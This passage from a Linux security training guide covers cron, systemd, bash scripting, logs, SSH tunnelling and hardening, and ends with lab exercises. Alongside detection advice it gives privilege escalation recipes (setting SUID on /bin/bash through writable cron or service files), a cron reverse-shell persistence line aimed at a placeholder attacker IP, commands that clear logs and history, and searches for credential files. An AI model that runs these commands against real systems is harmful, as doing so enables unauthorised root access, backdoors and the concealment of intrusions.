# Restart=on-failure
#
# [Install]
# WantedBy=multi-user.target
```

**Security Implication — Service File Modification:**
If an attacker can write to a service file or the directory containing it, they can modify `ExecStart` to execute arbitrary commands. Since services often run as root, this is a direct privilege escalation path:

```bash
# Check write permissions on service directories
ls -la /etc/systemd/system/
ls -la /usr/lib/systemd/system/

# If writable, modify a service that runs as root:
# ExecStart=/bin/bash -c 'chmod +s /bin/bash'
# Then restart the service → /bin/bash becomes SUID root
# Then: bash -p → root shell
```

### 8.4 Common Services in Security Contexts

```bash
# Services you will frequently interact with:
sudo systemctl start/stop/status ssh        # SSH server — remote access
sudo systemctl start/stop/status apache2    # Web server (Debian/Ubuntu)
sudo systemctl start/stop/status nginx      # Web server
sudo systemctl start/stop/status mysql      # MySQL database
sudo systemctl start/stop/status postgresql # PostgreSQL database
sudo systemctl start/stop/status docker     # Docker container engine
sudo systemctl start/stop/status cron       # Cron job scheduler
sudo systemctl start/stop/status rsyslog    # System logging

# In CTFs — start a service for enumeration:
sudo systemctl start ssh
# Now you can SSH into your lab machine from another VM
```

---

## 9. Cron Jobs

### 9.1 What Is Cron

Cron is the Linux task scheduler. It runs commands at specified times automatically. The cron daemon (`crond`) checks crontab files every minute and executes scheduled commands.

This is one of the most common **persistence mechanisms** for attackers and one of the most important **privilege escalation vectors** when misconfigured.

### 9.2 Crontab Syntax

```
* * * * * command_to_run
│ │ │ │ │
│ │ │ │ └── Day of week (0-7, 0=Sunday, 7=Sunday)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)

Special strings:
@reboot    → Run once at startup
@hourly    → Every hour
@daily     → Every day at midnight
@weekly    → Every Sunday midnight
@monthly   → First day of month at midnight
```

**Examples:**
```bash
# Run script every minute
* * * * * /usr/local/bin/script.sh

# Run at 3:30 AM every day
30 3 * * * /usr/local/bin/backup.sh

# Run every 15 minutes
*/15 * * * * /usr/local/bin/check.sh

# Run Monday to Friday at 9 AM
0 9 * * 1-5 /usr/local/bin/workday_task.sh

# Run at system boot
@reboot /usr/local/bin/startup.sh

# Run every hour
@hourly /usr/local/bin/hourly_task.sh
```

### 9.3 Managing Crontabs

```bash
# Edit your crontab
crontab -e                             # Opens in your default editor

# View your crontab
crontab -l

# Remove your crontab
crontab -r

# Edit another user's crontab (requires root)
sudo crontab -u john -e

# View root's crontab
sudo crontab -l
sudo crontab -u root -l
```

### 9.4 System-Wide Cron Locations

```bash
# System-wide crontab (has username field)
cat /etc/crontab

# Cron directories — drop scripts here
ls -la /etc/cron.d/          # Additional system cron jobs
ls -la /etc/cron.daily/      # Run daily
ls -la /etc/cron.hourly/     # Run hourly
ls -la /etc/cron.weekly/     # Run weekly
ls -la /etc/cron.monthly/    # Run monthly

# Individual user crontabs are stored here:
ls -la /var/spool/cron/crontabs/
sudo cat /var/spool/cron/crontabs/root
```

### 9.5 Cron as an Attack Surface

**Cron-based Privilege Escalation — the Most Common Linux Privesc:**

```bash
# Step 1: Find cron jobs running as root
cat /etc/crontab
ls -la /etc/cron.*
sudo crontab -l

# Step 2: Check if the script being run is writable
# Found: * * * * * root /usr/local/bin/cleanup.sh

ls -la /usr/local/bin/cleanup.sh
# -rwxrwxrwx root root  cleanup.sh  ← world-writable! attacker can modify it

# Step 3: Modify the script to execute your payload
echo '#!/bin/bash' > /usr/local/bin/cleanup.sh
echo 'chmod +s /bin/bash' >> /usr/local/bin/cleanup.sh
# Wait up to 60 seconds for cron to execute

# Step 4: After cron runs:
ls -la /bin/bash
# -rwsr-sr-x root root  /bin/bash  ← now SUID root

bash -p
whoami
# root
```

**Cron PATH Hijacking:**
```bash
# If /etc/crontab has:
# PATH=/usr/local/bin:/usr/bin:/bin
# * * * * * root cleanup.sh   ← no absolute path!

# And /usr/local/bin is writable:
echo '#!/bin/bash' > /usr/local/bin/cleanup.sh
echo 'chmod +s /bin/bash' >> /usr/local/bin/cleanup.sh
chmod +x /usr/local/bin/cleanup.sh
# Cron finds your script first in PATH, executes it as root
```

**Cron as Persistence (Attacker Perspective):**
```bash
# Add a cron job that reconnects to C2 every minute
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'") | crontab -

# At reboot
(crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/.hidden_backdoor") | crontab -
```

**Detection:**
```bash
# Monitor cron job changes
ls -lat /var/spool/cron/crontabs/    # Check modification times
inotifywait -m /var/spool/cron/crontabs/  # Real-time monitoring

# Check for recently modified cron-related files
find /etc/cron* -newer /etc/passwd 2>/dev/null
find /var/spool/cron -newer /etc/passwd 2>/dev/null
```

---

## 10. Bash Scripting Fundamentals

### 10.1 Why Scripting Is Non-Negotiable

Manual commands are for exploration. Scripts are for automation, repeatability, and scale. Every security professional needs scripting ability because:
- Automating reconnaissance across hundreds of targets
- Building custom detection logic
- Processing large log files
- Chaining tools together into workflows
- Writing proof-of-concept exploits

### 10.2 Script Structure

```bash
#!/bin/bash
# Shebang line — tells the OS what interpreter to use
# #!/bin/bash  → bash
# #!/bin/sh    → POSIX shell (more portable)
# #!/usr/bin/env python3  → Python 3

# Script metadata (good practice)
# Author: Your Name
# Date: 2026-01-01
# Purpose: Brief description

# Your code starts here
echo "Script started"
```

```bash
# Make a script executable
chmod +x script.sh

# Run it
./script.sh
bash script.sh        # Alternative, doesn't need execute permission
```

### 10.3 Variables

```bash
#!/bin/bash

# Variable assignment (no spaces around =)
name="Alice"
age=30
ip_address="192.168.1.100"

# Using variables ($ prefix)
echo "Hello, $name"
echo "Age: $age"
echo "Target: ${ip_address}"    # Curly braces for clarity

# Command substitution — store command output in variable
current_user=$(whoami)
hostname=$(hostname)
ip_list=$(ip addr | grep "inet " | awk '{print $2}')

echo "Running as: $current_user on $hostname"

# Special variables
echo "Script name: $0"
echo "First argument: $1"
echo "Second argument: $2"
echo "All arguments: $@"
echo "Argument count: $#"
echo "Last exit code: $?"       # 0 = success, non-zero = error
echo "Current PID: $$"

# Environment variables (already set by the system)
echo "Home: $HOME"
echo "Path: $PATH"
echo "User: $USER"
echo "Shell: $SHELL"

# Read-only variables
readonly MAX_RETRIES=3

# Unset variable
unset name
```

### 10.4 Conditionals

```bash
#!/bin/bash

# Basic if/else
if [ condition ]; then
    commands
elif [ other_condition ]; then
    commands
else
    commands
fi

# File tests
if [ -f "/etc/passwd" ]; then
    echo "File exists"
fi

if [ -d "/tmp" ]; then
    echo "Directory exists"
fi

if [ -r "/etc/shadow" ]; then
    echo "Shadow file is readable — you have root!"
fi

# File test operators:
# -f  → file exists and is regular file
# -d  → directory exists
# -e  → file/directory exists
# -r  → readable
# -w  → writable
# -x  → executable
# -s  → file exists and is non-empty
# -L  → symlink

# String comparisons
name="root"
if [ "$name" = "root" ]; then       # = for strings
    echo "Running as root"
fi

if [ "$name" != "nobody" ]; then
    echo "Not running as nobody"
fi

if [ -z "$variable" ]; then         # -z = empty string
    echo "Variable is empty"
fi

if [ -n "$variable" ]; then         # -n = non-empty string
    echo "Variable has content"
fi

# Numeric comparisons (use -eq, -ne, -lt, -gt, -le, -ge)
port=22
if [ "$port" -eq 22 ]; then
    echo "SSH port"
fi

if [ "$port" -lt 1024 ]; then
    echo "Privileged port"
fi

# Combining conditions
if [ -f "/etc/cron.d/job" ] && [ -w "/etc/cron.d/job" ]; then
    echo "Cron job file is writable — potential privesc!"
fi

if [ "$USER" = "root" ] || [ "$USER" = "admin" ]; then
    echo "Elevated user"
fi

# Modern syntax with [[ ]] (bash-specific, more powerful)
if [[ "$string" == *"password"* ]]; then    # Glob matching
    echo "Contains password"
fi

if [[ "$string" =~ ^[0-9]+$ ]]; then       # Regex matching
    echo "String is a number"
fi
```

### 10.5 Loops

```bash
#!/bin/bash

# For loop over a list
for host in 192.168.1.1 192.168.1.2 192.168.1.3; do
    ping -c 1 -W 1 "$host" &>/dev/null && echo "$host is up" || echo "$host is down"
done

# For loop with range
for i in {1..254}; do
    ping -c 1 -W 1 "192.168.1.$i" &>/dev/null && echo "192.168.1.$i is up" &
done
wait  # Wait for all background pings to complete

# C-style for loop
for ((i=0; i<10; i++)); do
    echo "Iteration $i"
done

# For loop over files
for file in /tmp/*.sh; do
    echo "Found script: $file"
    ls -la "$file"
done

# For loop over command output
for user in $(cut -d: -f1 /etc/passwd); do
    echo "User: $user"
done

# While loop
counter=0
while [ $counter -lt 5 ]; do
    echo "Counter: $counter"
    ((counter++))
done

# Read lines from file
while IFS= read -r line; do
    echo "Line: $line"
done < /etc/hosts

# Read from command output
while IFS= read -r ip; do
    nmap -p 80 "$ip" --open -q
done < ip_list.txt

# Until loop (runs until condition is true)
until [ -f "/tmp/done.flag" ]; do
    sleep 5
    echo "Waiting..."
done
```

### 10.6 Functions

```bash
#!/bin/bash

# Define a function
check_port() {
    local host="$1"      # local = function-scoped variable
    local port="$2"
    
    if timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null; then
        echo "[OPEN] $host:$port"
        return 0         # Success
    else
        echo "[CLOSED] $host:$port"
        return 1         # Failure
    fi
}

# Call the function
check_port "192.168.1.1" 22
check_port "192.168.1.1" 80

# Function with return value (via echo, not return)
get_ip() {
    local hostname="$1"
    nslookup "$hostname" | grep "Address:" | tail -1 | awk '{print $2}'
}

ip=$(get_ip "google.com")
echo "Google IP: $ip"
```

### 10.7 A Complete Security Script Example

```bash
#!/bin/bash
# Linux Local Privilege Escalation Checker — Educational Example
# Run on a target after gaining initial foothold

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'  # No colour

header() {
    echo -e "\n${YELLOW}=== $1 ===${NC}"
}

found() {
    echo -e "${RED}[!] POTENTIAL: $1${NC}"
}

info() {
    echo -e "${GREEN}[*] $1${NC}"
}

header "Current User"
id
whoami

header "Sudo Privileges"
sudo -l 2>/dev/null && found "Check sudo entries against GTFOBins"

header "SUID Binaries"
find / -perm -4000 -type f 2>/dev/null | while read -r binary; do
    echo "$binary"
done

header "Writable Cron Jobs"
for cron_file in /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/*; do
    if [ -w "$cron_file" ] 2>/dev/null; then
        found "Writable cron file: $cron_file"
    fi
done

header "World-Writable Service Files"
find /etc/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null |
    while read -r svc; do
        found "Writable service: $svc"
    done

header "Writable /etc/passwd"
[ -w /etc/passwd ] && found "/etc/passwd is writable!" || info "/etc/passwd not writable"

header "Recently Modified Files in /etc"
find /etc -mtime -1 -type f 2>/dev/null

echo -e "\n${GREEN}[*] Scan complete${NC}"
```

---

## 11. Linux Log System

### 11.1 The Importance of Logs for Security

Linux logs are the primary evidence trail for security events. Every authentication attempt, every sudo command, every service start and stop, every SSH connection, every kernel error — it is all logged. For defenders, logs are the foundation of detection. For attackers, understanding what gets logged (and how to manipulate it) is essential for operational security.

### 11.2 Log Locations — The Map

```bash
/var/log/
├── auth.log           → Authentication events (Debian/Ubuntu)
│                        SSH logins, sudo usage, user switches, PAM events
├── secure             → Same as auth.log (Red Hat/CentOS)
├── syslog             → General system messages (Debian/Ubuntu)
├── messages           → Same as syslog (Red Hat/CentOS)
├── kern.log           → Kernel messages only
├── dmesg              → Boot-time kernel ring buffer
├── faillog            → Failed login attempts
├── lastlog            → Last login per user
├── wtmp               → All login/logout history (binary)
├── btmp               → Failed login attempts (binary)
├── apt/               → APT package manager logs
├── nginx/             → Nginx web server access and error logs
│   ├── access.log
│   └── error.log
├── apache2/           → Apache web server logs
│   ├── access.log
│   └── error.log
├── mysql/             → MySQL database logs
├── postgresql/        → PostgreSQL logs
└── cron.log           → Cron job execution log (some distros)
```

### 11.3 Reading Binary Log Files

Some log files are binary format and require specific commands:

```bash
# lastlog — when each user last logged in
lastlog
lastlog -u john                        # Specific user

# last — login history from wtmp
last                                   # All logins
last -n 20                             # Last 20
last john                              # Specific user's logins
last reboot                            # System reboot history
last -F                                # Full timestamps

# lastb — failed login attempts from btmp (requires root)
sudo lastb
sudo lastb -n 20
sudo lastb -a                          # Show IP address in last column

# who — currently logged in users
who
w                                      # More detailed — what they're doing
```

### 11.4 Key Security Events in Logs

```bash
# Successful SSH logins
grep "Accepted" /var/log/auth.log
# Output: May 29 10:00:01 host sshd[1234]: Accepted publickey for john from 192.168.1.5 port 51234 ssh2

# Failed SSH attempts (brute force indicator)
grep "Failed password" /var/log/auth.log
grep "Invalid user" /var/log/auth.log

# Count failed attempts by IP (detect brute force)
grep "Failed password" /var/log/auth.log |
    grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" |
    sort | uniq -c | sort -rn | head -20

# Sudo usage — who ran what as root
grep "sudo" /var/log/auth.log
# Output: May 29 10:05:00 host sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/cat /etc/shadow

# New user creation
grep "useradd\|adduser\|new user" /var/log/auth.log

# SSH key-based authentication
grep "Accepted publickey" /var/log/auth.log

# PAM authentication failures (non-SSH)
grep "pam_unix.*authentication failure" /var/log/auth.log
```

### 11.5 journalctl — The systemd Log Interface

On systems using systemd, `journalctl` provides a unified interface to the systemd journal:

```bash
# View all logs
journalctl

# Most recent entries (follow like tail -f)
journalctl -f

# Last N lines
journalctl -n 50

# Logs since last boot
journalctl -b

# Previous boot logs
journalctl -b -1                       # One boot ago

# Filter by time
journalctl --since "2024-01-01 00:00:00"
journalctl --since "1 hour ago"
journalctl --since yesterday --until today

# Filter by service
journalctl -u ssh
journalctl -u nginx
journalctl -u cron

# Filter by priority
journalctl -p err                      # Errors only
journalctl -p 0..3                     # Emergency through Error

# Filter by executable
journalctl /usr/sbin/sshd

# Kernel messages only
journalctl -k

# Output formats
journalctl -o json-pretty              # JSON format
journalctl -o short-iso                # ISO timestamps
```

### 11.6 Log Manipulation — Attack and Detection

**Attackers clearing logs to cover tracks:**
```bash
# Clear auth.log (requires root)
> /var/log/auth.log                    # Truncate to zero bytes
echo "" > /var/log/auth.log
cat /dev/null > /var/log/auth.log

# Clear specific entries (more stealthy)
sed -i '/10\.10\.14\.5/d' /var/log/auth.log  # Remove lines with attacker's IP

# Clear bash history for current session
history -c                             # Clear in-memory history
unset HISTFILE                         # Don't write to disk
export HISTSIZE=0
cat /dev/null > ~/.bash_history

# Clear lastlog for specific user
lastlog -u john -t 0                   # Not standard but some implementations allow it
# More commonly: replace wtmp/btmp with modified versions using utmpdump
```

**Detection of log tampering:**
```bash
# File size of 0 on log files is suspicious
ls -lh /var/log/auth.log
# -rw-r--r-- 1 root adm 0 May 29 10:00 auth.log  ← zero bytes, suspicious

# Check inode timestamps
stat /var/log/auth.log
# If mtime (content modified) and ctime (inode changed) are very recent and simultaneous,
# someone cleared it

# Auditd can detect log file modifications
# (covered in hardening stage)

# Remote logging prevents local tampering
# rsyslog to a remote syslog server means clearing local logs doesn't help
# This is why remote log aggregation (SIEM) is essential
```

---

## 12. SSH — Secure Shell

### 12.1 What SSH Is and Why It Matters Everywhere

SSH (Secure Shell) is the standard protocol for secure remote access to Linux and Unix systems. Every server you will ever administrate, every CTF machine you will ever target, every cloud instance you will ever access — SSH is how you get in.

SSH provides:
- **Encrypted communication channel** — all data including passwords is encrypted
- **Authentication** — password or (preferably) public key
- **Remote command execution**
- **Port forwarding and tunnelling** — one of the most powerful features for security work

### 12.2 SSH Client — Connecting

```bash
# Basic connection
ssh user@hostname
ssh john@192.168.1.100
ssh john@192.168.1.100 -p 2222           # Non-standard port

# Run command without interactive shell
ssh john@192.168.1.100 "id && whoami"
ssh john@192.168.1.100 "cat /etc/passwd"

# Verbose mode — useful for debugging authentication
ssh -v john@192.168.1.100               # Verbose
ssh -vvv john@192.168.1.100             # Maximum verbosity

# No host key checking (dangerous for production, common in lab/CTF)
ssh -o StrictHostKeyChecking=no john@192.168.1.100

# Config file — manage multiple hosts
cat ~/.ssh/config
# Host ctf-machine
#     HostName 10.10.10.100
#     User john
#     Port 22
#     IdentityFile ~/.ssh/ctf_key

ssh ctf-machine                         # Uses config automatically
```

### 12.3 Key-Based Authentication — The Right Way

Password-based SSH is vulnerable to brute force. Key-based authentication is the standard for any serious environment.

```bash
# Generate SSH key pair
ssh-keygen -t ed25519 -C "your_email@example.com"
# -t ed25519  → EdDSA, modern, preferred (shorter than RSA, equally secure)
# -t rsa -b 4096  → RSA 4096-bit (legacy compatibility)

# Location:
# Private key: ~/.ssh/id_ed25519  (NEVER share this)
# Public key:  ~/.ssh/id_ed25519.pub  (safe to share)

# Copy public key to remote server
ssh-copy-id -i ~/.ssh/id_ed25519.pub john@192.168.1.100
# This appends your public key to ~/.ssh/authorized_keys on the remote server

# Manual method
cat ~/.ssh/id_ed25519.pub | ssh john@192.168.1.100 "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

# Correct permissions (SSH refuses to work if wrong)
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_ed25519              # Private key
chmod 644 ~/.ssh/id_ed25519.pub          # Public key
chmod 600 ~/.ssh/authorized_keys
```

### 12.4 SSH Tunnelling — The Security Professional's Swiss Army Knife

SSH tunnelling is one of the most powerful techniques in both offensive and defensive security work. It allows you to route traffic through SSH connections.

#### Local Port Forwarding

Forwards a port on your local machine through the SSH connection to a destination.

```bash
ssh -L [local_port]:[remote_host]:[remote_port] user@ssh_server

# Example: Access a web server that is only accessible from the target machine
# Target has a web server on localhost:8080 not exposed to the network
ssh -L 9090:localhost:8080 john@192.168.1.100
# Now: http://localhost:9090 on your machine → port 8080 on the target

# Example: Access an internal database through a jump host
ssh -L 5432:internal-db-server:5432 john@jump-host
# Connect to localhost:5432 → routes to internal-db-server:5432 via jump host
```

#### Remote Port Forwarding (Reverse Tunnelling)

Forwards a port on the remote server back to your local machine. Used to receive connections from a restricted network.

```bash
ssh -R [remote_port]:[local_host]:[local_port] user@ssh_server

# Example: Expose your local Burp Suite to a target you can SSH into
ssh -R 8080:localhost:8080 john@target
# Traffic to target:8080 → forwards to your localhost:8080 (Burp Suite)

# Reverse shell tunnel (post-exploitation):
# On compromised host:
ssh -R 4444:localhost:4444 attacker@your_server
# Now connections to your_server:4444 route to compromised_host:4444
```

#### Dynamic Port Forwarding — SOCKS Proxy

Turns SSH into a SOCKS5 proxy, routing all traffic through the SSH connection to the remote network.

```bash
ssh -D 1080 john@pivot_host
# Creates a SOCKS5 proxy on local port 1080

# Configure tools to use the proxy:
proxychains nmap -sV 10.10.10.0/24
proxychains curl http://internal-server/
proxychains python3 exploit.py

# Configure /etc/proxychains.conf:
# socks5 127.0.0.1 1080
```

**This is the foundation of pivoting** — reaching internal network segments through a compromised machine. Stage 4 will build on this extensively.

### 12.5 SSH Server Hardening

The SSH server configuration is in `/etc/ssh/sshd_config`. This file is the most important security configuration on any Linux server.

```bash
sudo nano /etc/ssh/sshd_config

# Critical security settings:

# Disable root login — always
PermitRootLogin no
# Justification: Even with strong auth, root login makes brute force more attractive
# and means a compromised credential = instant root

# Password authentication — disable if using keys
PasswordAuthentication no
# Only allow key-based auth — eliminates password brute force entirely

# Disable empty passwords
PermitEmptyPasswords no

# Limit authentication attempts
MaxAuthTries 3

# Limit login grace period
LoginGraceTime 30

# Restrict which users can SSH
AllowUsers john alice
AllowGroups sshusers
# Or deny specific:
DenyUsers nobody guest

# Change default port (security through obscurity, not a substitute for real security)
Port 2222
# Reduces automated scanner noise but determined attackers will find it

# Listen only on specific interface
ListenAddress 192.168.1.100
# Don't listen on all interfaces if not needed

# Disable X11 forwarding if not needed
X11Forwarding no

# Disable TCP forwarding if not needed (for untrusted users)
AllowTcpForwarding no

# Idle timeout
ClientAliveInterval 300     # Send keepalive every 300 seconds
ClientAliveCountMax 2       # Disconnect after 2 missed keepalives = 10 minutes idle

# Protocol version — SSHv2 only
Protocol 2                  # SSHv1 is broken, never use it

# Logging level
LogLevel VERBOSE            # More details than the default INFO

# Apply changes
sudo systemctl reload ssh
```

**After hardening — verify:**
```bash
# Test configuration for errors
sudo sshd -t                           # Test mode — reports config errors

# Check effective config
sudo sshd -T | grep -E "permitrootlogin|passwordauthentication|port|allowusers"
```

### 12.6 SSH Security Forensics

```bash
# Who is currently connected via SSH?
who
w
ss -tnp | grep :22

# Recent SSH connections
grep "Accepted" /var/log/auth.log | tail -20

# All SSH login attempts
grep "sshd" /var/log/auth.log | tail -50

# Authorized keys — who has key access?
cat ~/.ssh/authorized_keys
sudo cat /root/.ssh/authorized_keys

# Check for suspicious authorized keys
for user in $(cut -d: -f1 /etc/passwd); do
    home=$(eval echo "~$user")
    if [ -f "$home/.ssh/authorized_keys" ]; then
        echo "=== $user ==="
        cat "$home/.ssh/authorized_keys"
    fi
done
# Unexpected keys in root's authorized_keys = backdoor
```

---

## 13. Linux File System Hierarchy (FHS)

### 13.1 What FHS Is

The **Filesystem Hierarchy Standard (FHS)** defines the directory structure and content of Unix-like systems. Every Linux distribution follows it (mostly). Knowing where things live is essential for efficient security work.

```
/
├── bin/          → Essential user binaries (ls, cat, bash) — symlink to /usr/bin on modern systems
├── boot/         → Boot files (kernel, initrd, GRUB)
├── dev/          → Device files (disks, terminals, /dev/null, /dev/random)
├── etc/          → System-wide configuration files
├── home/         → User home directories (/home/username)
├── lib/          → Shared libraries for /bin and /sbin — symlink to /usr/lib
├── media/        → Mount points for removable media
├── mnt/          → Temporary mount points
├── opt/          → Optional/third-party software
├── proc/         → Virtual filesystem — kernel and process information
├── root/         → Root user's home directory
├── run/          → Runtime data (PIDs, sockets) — cleared on boot
├── sbin/         → System administration binaries — symlink to /usr/sbin
├── srv/          → Data for services (web, FTP)
├── sys/          → Virtual filesystem — hardware/kernel information
├── tmp/          → Temporary files — cleared on boot (world-writable!)
├── usr/          → User programs and data (the bulk of installed software)
│   ├── bin/      → User command binaries
│   ├── lib/      → Libraries
│   ├── local/    → Locally installed software (not from package manager)
│   ├── sbin/     → System admin binaries
│   └── share/    → Architecture-independent data
└── var/          → Variable data (logs, databases, mail, print spools)
    ├── log/      → Log files
    ├── www/      → Web server content (Apache/Nginx default)
    ├── lib/      → Persistent application data
    └── tmp/      → Temporary files preserved between reboots
```

### 13.2 Security-Critical Directories

```bash
# /etc — The Configuration Directory
# Every configuration file for every service lives here
ls /etc/
cat /etc/passwd             # User accounts
cat /etc/shadow             # Password hashes (root only)
cat /etc/sudoers            # Sudo configuration
cat /etc/hosts              # Local DNS resolution
cat /etc/crontab            # System cron jobs
cat /etc/ssh/sshd_config    # SSH server configuration
ls /etc/init.d/             # Legacy service scripts
ls /etc/systemd/system/     # systemd service files
ls /etc/cron.d/             # Additional cron job files
ls /etc/nginx/              # Nginx web server config
cat /etc/environment        # System-wide environment variables

# Post-exploitation: search /etc for credentials
grep -r "password\|passwd\|secret\|key" /etc/ 2>/dev/null

# /tmp and /var/tmp — The Wild West
# World-writable directories — attackers use these to stage payloads
ls -la /tmp
ls -la /var/tmp
# Both are writable by everyone
# Difference: /tmp is cleared on boot, /var/tmp persists across reboots
# Attackers prefer /var/tmp for persistence

# Find unexpected executables in /tmp (indicator of compromise)
find /tmp /var/tmp -type f -executable 2>/dev/null
find /tmp /var/tmp -name "*.sh" -o -name "*.py" -o -name "*.elf" 2>/dev/null

# /proc — Kernel and Process Intelligence
cat /proc/version            # Kernel version
cat /proc/cpuinfo            # CPU information
cat /proc/meminfo            # Memory information
cat /proc/net/tcp            # TCP connections (raw format)
cat /proc/net/arp            # ARP table (discovered hosts)
ls /proc/                    # PID directories for every running process

# Per-process intelligence:
cat /proc/1/cmdline          # Command that started PID 1 (init/systemd)
ls /proc/1/fd/               # Open file descriptors of PID 1
cat /proc/$$/environ | tr '\0' '\n'  # Your current process's environment variables

# /dev — Device Files
ls /dev/
/dev/null                    # Discard everything written here
/dev/zero                    # Source of null bytes
/dev/random                  # Cryptographically secure random (blocks)
/dev/urandom                 # Cryptographically secure random (non-blocking)
/dev/mem                     # Physical memory (restricted access)
/dev/sda, /dev/sdb           # Disk devices
/dev/pts/0, /dev/tty         # Terminal devices

# Reading /dev/random for entropy (useful in crypto contexts)
dd if=/dev/urandom bs=32 count=1 2>/dev/null | xxd   # Generate 32 random bytes

# /var/www — Web Server Root
ls /var/www/html/                   # Apache default
ls /etc/nginx/sites-enabled/        # Nginx virtual hosts
# Look for:
find /var/www -name "*.php" -exec grep -l "password\|db_pass\|mysql" {} \;
find /var/www -name "config.php" -o -name ".env" -o -name "wp-config.php"

# /home — User Data
ls /home/                           # What users have home directories?
ls -la /home/john/                  # Their files
cat /home/john/.bash_history        # What commands have they run?
ls /home/john/.ssh/                 # Do they have SSH keys?
find /home -name "*.txt" -o -name "*.pdf" -o -name "*.kdbx" 2>/dev/null
# .kdbx = KeePass database file — gold if found
```

### 13.3 Sensitive Files to Always Check

```bash
# During post-exploitation, check these immediately:

# Credential files
cat /etc/passwd
sudo cat /etc/shadow
sudo cat /etc/sudoers
find / -name ".bash_history" 2>/dev/null -exec cat {} \;
find / -name "id_rsa" 2>/dev/null          # Private SSH keys
find / -name "*.pem" 2>/dev/null           # SSL/TLS private keys
find / -name "*.key" 2>/dev/null
find / -name ".netrc" 2>/dev/null          # FTP/HTTP credentials
find / -name "*.kdbx" 2>/dev/null          # KeePass databases

# Web application credentials
find /var/www -name "wp-config.php" 2>/dev/null    # WordPress database creds
find /var/www -name ".env" 2>/dev/null             # Laravel/general env files
find /var/www -name "config.php" 2>/dev/null
find /opt -name "*.conf" 2>/dev/null

# Database files
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
find / -name "*.sql" 2>/dev/null

# Backup files (often contain old passwords)
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
```

---

## 14. Key Takeaways and Security Mindset

### 14.1 Linux Is Transparent by Design — Use That

Windows hides complexity. Linux exposes it. `/proc` gives you a window into the running kernel. `strace` shows every system call. Log files record everything. This transparency is a security professional's best friend — both for investigating systems and for understanding what your own tools are doing under the hood.

### 14.2 Permissions Are Everything

The entire Linux security model is built on file permissions, user IDs, and group IDs. Every privilege escalation technique ultimately exploits a misconfiguration in this model:
- SUID binary owned by root → run as root
- World-writable cron script running as root → write malicious commands
- World-writable service file → modify service to execute your code
- Writable /etc/passwd → add root-level user

The checklist is always the same: `sudo -l`, SUID files, writable cron jobs, writable service files, PATH hijacking opportunities. Memorise it.

### 14.3 For OT/ICS Linux Systems

- Many industrial devices run embedded Linux (OpenWRT, Buildroot, Yocto). The same commands and concepts apply, but the environment is constrained — often no package manager, limited binaries, read-only filesystem in some cases.
- SCADA historian servers, protocol gateways, and engineering workstations often run Ubuntu or CentOS. They are typically unpatched and running outdated kernels with known privilege escalation vulnerabilities.
- SSH is commonly used for administration of Linux-based OT devices. Default credentials and weak SSH configurations are endemic in industrial environments.
- Log review is rarely done in OT environments — meaning attackers can operate undetected for extended periods. Your ability to set up logging and detect anomalies is directly applicable.

### 14.4 The Command Line Is Precision

A GUI hides what is actually happening. Every click translates to system calls and file operations that you cannot see. The command line shows you exactly what is happening, gives you complete control, and scales to automation through scripting. Embrace it — discomfort with the terminal is a ceiling on your effectiveness.

---

## 15. Hands-On Exercises

### Exercise 1: File System Reconnaissance (45 minutes)

```bash
# On a fresh Ubuntu VM, map the security-relevant landscape

# 1. Find all SUID binaries and check each against GTFOBins
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid_binaries.txt
cat /tmp/suid_binaries.txt

# 2. Find world-writable directories
find / -type d -perm -0002 2>/dev/null | grep -v proc | grep -v sys

# 3. Check sudo configuration
sudo -l

# 4. Examine /etc/crontab and cron directories
cat /etc/crontab
ls -la /etc/cron.*

# 5. Check running services and their users
ps aux | awk '{print $1}' | sort | uniq -c | sort -rn
# What users are running services? Are any unexpected?
```

### Exercise 2: Log Analysis — Build a Story (1 hour)

```bash
# Set up SSH password authentication temporarily for this exercise
# Then generate activity:

# 1. Make several failed SSH login attempts from another terminal
ssh wronguser@localhost
ssh root@localhost  # Should fail if PermitRootLogin no

# 2. Make a successful login

# 3. Run some sudo commands
sudo ls /etc/shadow
sudo cat /etc/sudoers

# 4. Now analyse the logs:
grep "sshd" /var/log/auth.log | tail -30
grep "sudo" /var/log/auth.log | tail -20

# 5. Write a one-liner to find the top 5 IPs with failed SSH attempts
grep "Failed password" /var/log/auth.log |
    grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" |
    sort | uniq -c | sort -rn | head -5
```

### Exercise 3: Permission Misconfiguration — Exploit It (30 minutes)

```bash
# Set up a vulnerable scenario on your lab VM (as root):
echo '#!/bin/bash' > /usr/local/bin/vulnerable_script.sh
echo 'echo "Running maintenance..."' >> /usr/local/bin/vulnerable_script.sh
chmod 777 /usr/local/bin/vulnerable_script.sh  # World-writable!

# Add it to crontab running as root
echo "* * * * * root /usr/local/bin/vulnerable_script.sh" >> /etc/crontab

# Now switch to a non-root user and exploit it:
su - normaluser

# Check for the writable script
ls -la /usr/local/bin/vulnerable_script.sh

# Modify it
echo '#!/bin/bash' > /usr/local/bin/vulnerable_script.sh
echo 'chmod +s /bin/bash' >> /usr/local/bin/vulnerable_script.sh

# Wait up to 60 seconds
sleep 60

# Check if bash is now SUID
ls -la /bin/bash
# -rwsr-sr-x root root  /bin/bash  ← SUID set by our script running as root

# Get root shell
bash -p
whoami
# root

# Clean up after the exercise
# (as root): chmod -s /bin/bash && sed -i '/vulnerable_script/d' /etc/crontab
```

### Exercise 4: SSH Tunnelling (45 minutes)

```bash
# Lab setup: Two VMs — Attacker (Kali) and Target (Ubuntu Server)
# Target has a web application running on localhost:3000 (not exposed to network)

# On Target: start a simple web service
python3 -m http.server 3000 --bind 127.0.0.1

# On Attacker: create local port forward through SSH
